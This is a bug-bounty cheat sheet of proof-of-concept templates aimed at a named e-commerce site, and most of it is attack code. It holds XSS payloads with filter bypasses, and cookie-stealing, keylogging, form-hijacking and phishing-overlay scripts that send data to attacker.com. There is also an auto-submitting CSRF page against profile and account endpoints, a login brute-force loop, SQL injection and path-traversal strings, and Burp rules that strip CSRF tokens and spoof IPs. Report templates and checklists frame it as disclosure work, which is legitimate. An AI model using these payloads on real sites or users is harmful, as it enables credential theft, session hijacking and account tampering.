# PoC Templates & Quick Reference

> **Документ:** Шаблоны Proof of Concept и быстрые справочники  
> **Дата:** 2025-12-08  
> **Использование:** Копировать и адаптировать под конкретные находки

---

## 📋 Содержание

1. [XSS Payloads](#xss-payloads)
2. [IDOR Test Cases](#idor-test-cases)
3. [CSRF Test Templates](#csrf-test-templates)
4. [Authentication Tests](#authentication-tests)
5. [API Security Tests](#api-security-tests)
6. [Report Templates](#report-templates)

---

## 🎯 XSS Payloads

### Basic XSS Tests

```html
<!-- Simple alert -->
<script>alert(1)</script>

<!-- Image onerror -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>

<!-- Breaking out of attribute context -->
"><img src=x onerror=alert(1)>

<!-- Breaking out of script context -->
</script><img src=x onerror=alert(1)>

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>

<!-- Markdown injection (if site uses markdown) -->
[XSS](javascript:alert(1))

<!-- Data URIs -->
<a href="data:text/html,<script>alert(1)</script>">Click</a>
```

### CSS Context XSS

```html
<!-- Breaking out of style tag -->
</style><img src=x onerror=alert(1)>

<!-- CSS expression (IE only) -->
<div style="background:url('javascript:alert(1)')">

<!-- CSS import -->
<style>@import'http://attacker.com/xss.css';</style>
```

### Advanced XSS Payloads

```javascript
// Cookie theft
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

// Session hijacking
<script>
fetch('http://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    localStorage: localStorage,
    url: window.location.href
  })
});
</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
});
</script>

// Form hijacking
<script>
document.querySelectorAll('form').forEach(form => {
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    fetch('http://attacker.com/steal', {
      method: 'POST',
      body: new FormData(form)
    });
  });
});
</script>

// Phishing overlay
<script>
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
    <form action="http://attacker.com/phish" method="POST">
      <h2>Session Expired - Please Login</h2>
      <input name="username" placeholder="Email">
      <input name="password" type="password" placeholder="Password">
      <button type="submit">Login</button>
    </form>
  </div>
`;
</script>
```

### Filter Bypass Techniques

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- HTML encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- URL encoding -->
<img src=x onerror="alert%281%29">

<!-- Unicode -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- Mixed encoding -->
<img src=x onerror="&#x61;lert(1)">

<!-- Null byte -->
<img src=x onerror="alert(1)%00">

<!-- Comments -->
<img src=x onerror="/**/alert(1)">
<img src=x onerror="al/**/ert(1)">

<!-- Alternative event handlers -->
<img src=x onload=alert(1)>
<img src=x onerror=alert(1)>
<img src=x onmouseover=alert(1)>

<!-- No quotes -->
<img src=x onerror=alert(1)>

<!-- No parentheses (if eval available) -->
<img src=x onerror=alert`1`>

<!-- Using template literals -->
<img src=x onerror=`alert\x281\x29`>
```

---

## 🔐 IDOR Test Cases

### Customer Data IDOR

```http
# Test 1: View own customer config
GET /api/customer-config/v1/customerconfiguration/123 HTTP/1.1
Host: www.zooplus.de
Authorization: Bearer <token_account_a>

Expected: 200 OK with own data

# Test 2: Attempt to view other user's config
GET /api/customer-config/v1/customerconfiguration/456 HTTP/1.1
Host: www.zooplus.de
Authorization: Bearer <token_account_a>

Expected: 403 Forbidden
Vulnerability if: 200 OK with other user's data
```

### Order Details IDOR

```http
# Test 1: View own order
GET /api/order-details/v3/customer/order/12345 HTTP/1.1
Host: www.zooplus.de
Authorization: Bearer <token_account_a>

Expected: 200 OK with own order

# Test 2: Sequential ID enumeration
GET /api/order-details/v3/customer/order/12346 HTTP/1.1
GET /api/order-details/v3/customer/order/12347 HTTP/1.1
GET /api/order-details/v3/customer/order/12348 HTTP/1.1

Vulnerability if: Can access other users' orders
```

### Address Book IDOR

```http
# Test: Modify address belonging to different user
PUT /api/addresses/789 HTTP/1.1
Host: www.zooplus.de
Authorization: Bearer <token_account_a>
Content-Type: application/json

{
  "street": "Attacker Street 123",
  "city": "Berlin"
}

Expected: 403 Forbidden or 404 Not Found
Vulnerability if: 200 OK and address is modified
```

### Invoice/PDF IDOR

```http
# Test: Direct access to invoice PDF
GET /invoices/ORDER-12345.pdf HTTP/1.1
Host: www.zooplus.de

Expected: 401 Unauthorized or 403 Forbidden
Vulnerability if: PDF is accessible without authentication

# Test: Sequential enumeration
GET /invoices/ORDER-12346.pdf HTTP/1.1
GET /invoices/ORDER-12347.pdf HTTP/1.1

Vulnerability if: Can download other users' invoices
```

---

## 🛡️ CSRF Test Templates

### CSRF Test Page Template

```html
<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <p>Click the button to trigger the CSRF attack:</p>
  
  <!-- Method 1: Form submission -->
  <form id="csrf-form" action="https://www.zooplus.de/api/profile/update" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="phone" value="+49123456789">
    <button type="submit">Click Me!</button>
  </form>

  <!-- Method 2: Auto-submit (silent attack) -->
  <script>
    // Auto-submit after 1 second
    setTimeout(function() {
      document.getElementById('csrf-form').submit();
    }, 1000);
  </script>

  <!-- Method 3: Using fetch (requires CORS) -->
  <script>
    fetch('https://www.zooplus.de/api/cart/add', {
      method: 'POST',
      credentials: 'include', // Include cookies
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        productId: '12345',
        quantity: 1
      })
    });
  </script>

  <!-- Method 4: Image tag (GET requests) -->
  <img src="https://www.zooplus.de/api/profile/delete?userId=123" style="display:none;">
</body>
</html>
```

### Testing CSRF Protection

```bash
# Test 1: Remove CSRF token from request
Original:
POST /api/profile/update HTTP/1.1
Content-Type: application/json
X-CSRF-Token: abc123...

{"email": "new@email.com"}

Modified (remove token):
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"email": "new@email.com"}

Expected: 403 Forbidden or 401 Unauthorized
Vulnerability if: 200 OK and action is performed

# Test 2: Use token from different session
POST /api/profile/update HTTP/1.1
Cookie: session=user_a_session
X-CSRF-Token: user_b_csrf_token

{"email": "new@email.com"}

Expected: 403 Forbidden
Vulnerability if: 200 OK

# Test 3: Reuse old token
Use a token that was already consumed
Expected: 403 Forbidden
Vulnerability if: Token can be reused

# Test 4: Check Origin/Referer validation
POST /api/profile/update HTTP/1.1
Origin: http://evil.com
Referer: http://evil.com/csrf.html

Expected: Request blocked
Vulnerability if: Request accepted
```

---

## 🔑 Authentication Tests

### Rate Limiting Tests

```python
import requests

# Test: Check if login rate limiting exists
url = "https://www.zooplus.de/api/auth/login"

for i in range(100):
    response = requests.post(url, json={
        "email": "test@example.com",
        "password": "wrong_password_" + str(i)
    })
    print(f"Attempt {i+1}: Status {response.status_code}")
    
    # Check for rate limiting indicators
    if response.status_code == 429:  # Too Many Requests
        print("✅ Rate limiting detected!")
        break
    elif "captcha" in response.text.lower():
        print("✅ CAPTCHA triggered!")
        break
    elif i == 99:
        print("❌ No rate limiting detected after 100 attempts!")
```

### Password Reset Token Analysis

```python
import requests
import hashlib

# Collect multiple reset tokens
tokens = []
for i in range(10):
    response = requests.post(
        "https://www.zooplus.de/api/auth/reset-password",
        json={"email": f"test{i}@example.com"}
    )
    # Extract token from email or response
    token = response.json().get('token')
    tokens.append(token)

# Analyze token properties
for token in tokens:
    print(f"Token: {token}")
    print(f"Length: {len(token)}")
    print(f"Entropy: {len(set(token))}")
    
# Check if tokens are predictable
# Low entropy or sequential patterns = vulnerability
```

### Session Cookie Analysis

```bash
# Check cookie flags
HTTP Response:
Set-Cookie: session=abc123; Domain=.zooplus.de; Path=/; HttpOnly; Secure; SameSite=Strict

✅ Secure: Only transmitted over HTTPS
✅ HttpOnly: Not accessible via JavaScript (XSS protection)
✅ SameSite: CSRF protection

# Test: Try to access cookie via XSS
<script>alert(document.cookie)</script>

Expected: Cookie not shown (HttpOnly protection)
Vulnerability if: Cookie is accessible
```

---

## 🌐 API Security Tests

### API Endpoint Discovery

```bash
# Common API paths to test
/api/
/api/v1/
/api/v2/
/graphql
/graphql/v1
/rest/
/rest/v1/
/api/swagger
/api/docs
/api-docs
/swagger.json
/openapi.json

# GraphQL introspection
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{__schema{types{name,fields{name}}}}"
}
```

### CORS Misconfiguration Tests

```javascript
// Test 1: Check if API allows any origin
fetch('https://www.zooplus.de/api/customer/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => console.log('Vulnerable if this works from evil.com:', data));

// Test 2: Check CORS headers
// Make request from http://evil.com
// Check response headers:
// Access-Control-Allow-Origin: * ❌ VULNERABLE
// Access-Control-Allow-Origin: http://evil.com ❌ VULNERABLE
// Access-Control-Allow-Origin: https://www.zooplus.de ✅ SECURE
// (no CORS header) ✅ SECURE
```

### API Authorization Tests

```http
# Test 1: Access API without authentication
GET /api/customer/profile HTTP/1.1
Host: www.zooplus.de

Expected: 401 Unauthorized
Vulnerability if: 200 OK with data

# Test 2: Access API with expired token
GET /api/customer/profile HTTP/1.1
Host: www.zooplus.de
Authorization: Bearer <expired_token>

Expected: 401 Unauthorized
Vulnerability if: 200 OK

# Test 3: Access API with manipulated token
GET /api/customer/profile HTTP/1.1
Host: www.zooplus.de
Authorization: Bearer <modified_token>

Expected: 401 Unauthorized
Vulnerability if: 200 OK

# Test 4: Parameter pollution
GET /api/customer/profile?userId=123&userId=456 HTTP/1.1

Test if server processes first, last, or both values
```

---

## 📝 Report Templates

### Vulnerability Report Template (HackerOne)

```markdown
# [Vulnerability Type] in [Location]

## Summary

[Brief description of the vulnerability in 2-3 sentences]

## Severity

**CVSS Score:** [Score] ([Severity Level])

**Metrics:**
- Attack Vector: [Network/Adjacent/Local/Physical]
- Attack Complexity: [Low/High]
- Privileges Required: [None/Low/High]
- User Interaction: [None/Required]
- Scope: [Unchanged/Changed]
- Confidentiality Impact: [None/Low/High]
- Integrity Impact: [None/Low/High]
- Availability Impact: [None/Low/High]

## Affected Components

- **URL:** [Vulnerable URL]
- **Parameter:** [Vulnerable parameter]
- **HTTP Method:** [GET/POST/PUT/DELETE]
- **Affected Versions:** [If known]

## Vulnerability Details

[Detailed technical explanation of the vulnerability]

### Root Cause

[Explain why this vulnerability exists]

## Proof of Concept

### Step-by-step Reproduction:

1. [First step]
2. [Second step]
3. [Third step]
...

### Request/Response:

```http
[Include vulnerable HTTP request]
```

```http
[Include server response]
```

### Screenshots/Videos:

[Attach evidence]

## Impact

[Explain what an attacker can do with this vulnerability]

**Potential Consequences:**
- [Consequence 1]
- [Consequence 2]
- [Consequence 3]

**Real-World Attack Scenario:**
[Describe a realistic attack scenario]

## Remediation

### Recommended Fix:

[Provide specific code or configuration changes]

### Alternative Solutions:

[If applicable, provide alternative approaches]

### Verification:

[How to verify the fix works]

## References

- [Link to similar vulnerabilities]
- [Link to security best practices]
- [Link to vendor documentation]

## Timeline

- **Discovery Date:** [Date]
- **Reported Date:** [Date]
- **Vendor Response:** [Date]
- **Fix Released:** [Date]
- **Public Disclosure:** [Date]

## Attachments

- [File 1]
- [File 2]
- [File 3]
```

### Quick Summary Template

```markdown
# Quick Vulnerability Summary

**Type:** [XSS/IDOR/CSRF/etc]
**Severity:** [Critical/High/Medium/Low]
**CVSS:** [Score]

**Location:** [URL]
**Parameter:** [Parameter name]

**PoC:** [One-liner or minimal steps]

**Impact:** [Brief impact statement]

**Fix:** [Quick fix recommendation]

**Status:** [New/Confirmed/Fixed/Won't Fix]
```

---

## 🎯 Testing Checklist Quick Reference

```
Authentication & Sessions:
□ Rate limiting on login
□ Rate limiting on password reset
□ Token entropy analysis
□ Session fixation tests
□ Cookie security flags (Secure, HttpOnly, SameSite)
□ Logout functionality
□ Concurrent sessions

Authorization:
□ IDOR on user profile
□ IDOR on orders/invoices
□ IDOR on addresses
□ IDOR on payment methods
□ Horizontal privilege escalation
□ Vertical privilege escalation

Input Validation:
□ XSS in search
□ XSS in profile fields
□ XSS in reviews/comments
□ SQL injection
□ Command injection
□ LDAP injection
□ XML injection

CSRF:
□ Profile update
□ Password change
□ Email change
□ Add to cart
□ Checkout
□ Delete account

API Security:
□ Authentication required
□ Authorization checks
□ Rate limiting
□ CORS configuration
□ GraphQL introspection
□ Mass assignment
□ API versioning security

Business Logic:
□ Price manipulation
□ Quantity manipulation
□ Promo code bypass
□ Negative values
□ Race conditions
□ Workflow bypass
```

---

## 🔧 Useful Burp Suite Snippets

### Active Scan Insert Points

```
# Add to Burp Suite > Intruder > Positions

# XSS payloads
§<script>alert(1)</script>§
§<img src=x onerror=alert(1)>§
§"><svg onload=alert(1)>§

# SQL injection
§' OR '1'='1§
§1' UNION SELECT NULL--§
§admin'--§

# IDOR
§1§ to §9999§ (sequential IDs)
§../../../etc/passwd§ (path traversal)
```

### Match/Replace Rules

```
# Automatically remove CSRF tokens
Match: X-CSRF-Token: .*
Replace: (empty)

# Change content type
Match: Content-Type: application/json
Replace: Content-Type: application/xml

# Bypass IP restrictions
Match: (empty)
Replace: X-Forwarded-For: 127.0.0.1
```

---

## 📚 Additional Resources

### Documentation Links

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [CVSS Calculator](https://www.first.org/cvss/calculator/4.0)

### Tools

- **Burp Suite** - HTTP proxy and scanner
- **OWASP ZAP** - Free security scanner
- **SQLMap** - SQL injection tool
- **XSStrike** - XSS detection tool
- **Nuclei** - Vulnerability scanner
- **Postman** - API testing
- **JWT.io** - JWT decoder

---

**© 2025 | PoC Templates & Quick Reference**

